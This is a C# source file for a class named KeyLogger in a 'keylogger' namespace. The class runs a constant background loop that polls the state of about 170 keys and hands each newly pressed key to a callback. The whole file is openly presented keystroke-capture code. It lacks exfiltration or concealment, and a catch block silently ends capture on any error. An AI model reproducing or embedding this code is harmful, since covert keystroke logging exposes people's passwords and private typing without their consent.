using System;
using System.Windows.Input;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace keylogger
{
    public class KeyLogger
    {
        public bool start { get; private set; }

        private Dictionary<Key, bool> keys;

        public KeyLogger()
        {
            keys = new Dictionary<Key, bool>();
            for (int i = 1; i < 172; i++)
            {
                keys.Add((Key)i, true);
            }
            start = false;
        }

        public void Hook(Action<Key> LogKeys)
        {
            Task.Run(() =>
            {
                start = true;
                try
                {
                    while (true)
                    {
                        foreach (var item in keys)
                        {
                            if (Keyboard.IsKeyDown(item.Key) && item.Value == true)
                            {
                                LogKeys(item.Key);
                                keys[item.Key] = false;
                            }
                            if (Keyboard.IsKeyUp(item.Key))
                            {
                                keys[item.Key] = true;
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    start = false;
                    return;
                }
            });
        }
    }
}